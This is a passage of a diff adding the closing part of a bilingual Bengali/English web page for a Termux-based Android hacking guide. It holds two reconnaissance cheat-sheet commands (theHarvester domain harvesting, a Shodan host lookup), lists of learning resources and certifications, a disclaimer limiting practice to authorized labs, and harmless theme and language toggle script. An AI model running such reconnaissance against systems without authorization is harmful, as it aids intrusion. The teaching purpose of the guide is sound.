+          <div class="cheat-row"><div class="cheat-cmd">theHarvester -d target.com -b all</div><div class="cheat-desc">Domain harvest</div></div>
+          <div class="cheat-row"><div class="cheat-cmd">shodan host [IP]</div><div class="cheat-desc">Shodan lookup</div></div>
+        </div>
+      </div>
+    </div>
+
+    <h2 class="sec">📚 <span class="bn-text">সেরা Resources</span><span class="en-text">Best Resources</span></h2>
+    <div class="grid3">
+      <div class="card success-card">
+        <h4>🆓 Free</h4>
+        <ul>
+          <li>OWASP Mobile Testing Guide</li>
+          <li>PortSwigger Web Academy</li>
+          <li>TryHackMe (free tier)</li>
+          <li>HackTheBox (free)</li>
+          <li>YouTube: NetworkChuck</li>
+          <li>NullByte.WonderHowTo.com</li>
+        </ul>
+      </div>
+      <div class="card">
+        <h4>📖 Books</h4>
+        <ul>
+          <li>Android Security Internals</li>
+          <li>The Mobile Application Hacker's Handbook</li>
+          <li>Android Hacker's Handbook</li>
+          <li>Hacking APIs — Corey J Ball</li>
+        </ul>
+      </div>
+      <div class="card teal-card">
+        <h4>🏅 Certifications</h4>
+        <ul>
+          <li>eMAPT (eLearnSecurity)</li>
+          <li>GMOB (GIAC)</li>
+          <li>CEH (EC-Council)</li>
+          <li>OSCP (Offensive Security)</li>
+        </ul>
+      </div>
+    </div>
+
+    <div style="text-align:center; margin-top:50px; padding:35px; background:linear-gradient(135deg,#0a1f0a,#1a4731); border-radius:12px; color:rgba(255,255,255,0.8);">
+      <p style="font-size:22px; color:#2dc653; margin-bottom:12px;">📱 "Security is not a product, but a process — and Termux is your laboratory."</p>
+      <p>
+        <span class="bn-text">এই গাইড সম্পূর্ণ শিক্ষামূলক। সবসময় নিজের Device বা authorized Lab-এ Practice করো।</span>
+        <span class="en-text">This guide is entirely educational. Always practice on your own device or in an authorized lab.</span>
+      </p>
+      <p style="margin-top:15px; font-size:13px; color:#2dc653;">Android Hacking (Termux-based) — <span class="bn-text">সম্পূর্ণ বাংলা গাইড</span><span class="en-text">Complete Bilingual Guide</span></p>
+      <p style="font-size:12px; color:rgba(255,255,255,0.4); margin-top:8px;">14 Chapters • Bilingual • Dark Mode • Full Cheat Sheet • Career Guide</p>
+    </div>
+  </div>
+</div>
+
+<script>
+const body = document.body;
+body.classList.add('light-mode');
+function toggleTheme() {
+  const btn = document.getElementById('themeBtn');
+  if (body.classList.contains('light-mode')) {
+    body.classList.replace('light-mode','dark-mode');
+    btn.textContent = '☀️ Light Mode';
+    localStorage.setItem('theme','dark');
+  } else {
+    body.classList.replace('dark-mode','light-mode');
+    btn.textContent = '🌙 Dark Mode';
+    localStorage.setItem('theme','light');
+  }
+}
+function toggleLang() {
+  const btn = document.getElementById('langBtn');
+  if (body.classList.contains('lang-en')) {
+    body.classList.remove('lang-en');
+    btn.textContent = '🇬🇧 English';
+    btn.style.background = '#0077b6';
+    localStorage.setItem('lang','bn');
+  } else {
+    body.classList.add('lang-en');
+    btn.textContent = '🇧🇩 বাংলা';
+    btn.style.background = '#e63946';
+    localStorage.setItem('lang','en');
+  }
+}
+window.addEventListener('DOMContentLoaded', () => {
+  if (localStorage.getItem('theme') === 'dark') {
+    body.classList.replace('light-mode','dark-mode');
+    const btn = document.getElementById('themeBtn');
+    if (btn) btn.textContent = '☀️ Light Mode';
+  }
+  if (localStorage.getItem('lang') === 'en') {
+    body.classList.add('lang-en');
+    const btn = document.getElementById('langBtn');
+    if (btn) { btn.textContent = '🇧🇩 বাংলা'; btn.style.background = '#e63946'; }
+  }
+});
+</script>
+</body>
+</html>
